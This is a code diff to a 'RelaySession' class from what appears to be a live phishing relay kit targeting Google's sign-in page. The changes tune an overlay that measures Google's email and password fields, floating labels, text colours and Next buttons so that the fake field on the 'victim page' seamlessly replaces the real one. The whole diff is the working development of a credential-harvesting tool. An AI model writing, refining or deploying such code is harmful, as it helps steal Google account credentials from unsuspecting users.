@@ -387,10 +387,8 @@ class RelaySession(threading.Thread):
             self.button_box = None
             self.label = None
             if ibox:
-                # overlay = the whole field FRAME (incl. the strip where the
-                # floating label lives); the label itself is re-drawn by the
-                # victim page at its measured position so it can never be
-                # clipped mid-glyph by the overlay
+                # widen to the visible field WRAPPER (includes floating label
+                # strip + border) so the overlay fully replaces Google's field
                 try:
                     pbox = loc.evaluate(
                         "el => { const p = el.parentElement; if (!p) return null;"
@@ -402,14 +400,10 @@ class RelaySession(threading.Thread):
                                 "width": pbox["w"], "height": pbox["h"]}
                 except Exception:
                     pass
-                self.input_box = {
-                    "x": round(100 * (ibox["x"] - cbox["x"]) / cbox["width"], 2),
-                    "y": round(100 * (ibox["y"] - cbox["y"]) / cbox["height"], 2),
-                    "w": round(100 * ibox["width"] / cbox["width"], 2),
-                    "h": round(100 * ibox["height"] / cbox["height"], 2)}
-                # floating label: find the leaf text element inside the field
-                # container that overlaps the frame — re-drawn as DOM on the
-                # victim page so the overlay can never clip it
+                # floating label: leaf text element overlapping the frame.
+                # If it straddles the frame's top edge, extend the overlay to
+                # cover the WHOLE label and re-draw it as DOM — otherwise the
+                # uncovered sliver would ghost under the DOM copy
                 try:
                     lab = loc.evaluate(
                         "el => { let n = el;"
@@ -423,17 +417,33 @@ class RelaySession(threading.Thread):
                         "   if (!best || r.width > best.w) {"
                         "    const cs = getComputedStyle(c);"
                         "    best = {x: r.x, y: r.y, w: r.width, h: r.height,"
-                        "            fs: parseFloat(cs.fontSize) || 14, text: t.slice(0, 40)}; }"
+                        "            fs: parseFloat(cs.fontSize) || 14,"
+                        "            col: cs.color, text: t.slice(0, 40)}; }"
                         " } return best; }")
-                    if lab:
+                    if lab and lab["y"] + lab["h"] > ibox["y"] + 2:
+                        # label straddles the frame top: extend over it, keep
+                        # the real left/right/bottom border visible (2px inset)
+                        new_top = min(ibox["y"], lab["y"] - 2)
                         self.label = {
                             "x": round(100 * (lab["x"] - cbox["x"]) / cbox["width"], 2),
                             "y": round(100 * (lab["y"] - cbox["y"]) / cbox["height"], 2),
                             "w": round(100 * lab["w"] / cbox["width"], 2),
                             "h": round(100 * lab["h"] / cbox["height"], 2),
-                            "fs": round(lab["fs"], 1), "text": lab["text"]}
+                            "fs": round(lab["fs"], 1), "col": lab.get("col", "#5f6368"),
+                            "text": lab["text"]}
+                    else:
+                        # no overlapping label: plain 2px inset into the frame
+                        new_top = ibox["y"] + 2
+                    ibox = {"x": ibox["x"] + 2, "y": new_top,
+                            "width": ibox["width"] - 4,
+                            "height": ibox["y"] + ibox["height"] - 2 - new_top}
                 except Exception:
                     pass
+                self.input_box = {
+                    "x": round(100 * (ibox["x"] - cbox["x"]) / cbox["width"], 2),
+                    "y": round(100 * (ibox["y"] - cbox["y"]) / cbox["height"], 2),
+                    "w": round(100 * ibox["width"] / cbox["width"], 2),
+                    "h": round(100 * ibox["height"] / cbox["height"], 2)}
                 # the real button (wrapper divs inflate the box ~52px; the
                 # inner button is Google's ~40px pill)
                 for bsel in ("#identifierNext button", "#passwordNext button",
